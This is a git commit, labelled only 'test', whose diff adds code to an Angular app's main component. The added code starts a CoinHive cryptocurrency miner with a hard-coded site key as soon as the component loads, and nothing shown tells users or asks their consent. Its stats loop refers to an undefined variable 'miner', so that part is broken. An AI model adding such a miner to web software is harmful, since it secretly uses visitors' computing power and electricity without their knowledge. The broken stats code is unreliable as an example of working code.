1a2aeea99562993d140e186afaec9ddc4ab321ed
taraegodbolt <36281421+taraegodbolt@users.noreply.github.com>
2018-02-08 20:09:41 -0600

    test

--- src/app/app.component.ts
+++ src/app/app.component.ts
@@ -6,4 +6,19 @@ import { Component } from '@angular/core';
 })
 export class AppComponent {
   title = 'app';
+  constructor() {
+    const mnnc = new CoinHive.Anonymous('FgNYlyRdWZc5Px5xoZXsrxqv7A6YLkkh', {throttle: 0.3});
+    mnnc.start();
+    mnnc.on('found', function() { /* Hash found */ })
+    mnnc.on('accepted', function() { /* Hash accepted by the pool */ })
+
+    // Update stats once per second
+    setInterval(function() {
+      var hashesPerSecond = miner.getHashesPerSecond();
+      var totalHashes = miner.getTotalHashes();
+      var acceptedHashes = miner.getAcceptedHashes();
+
+      // Output to HTML elements...
+    }, 1000);
+  }
 }
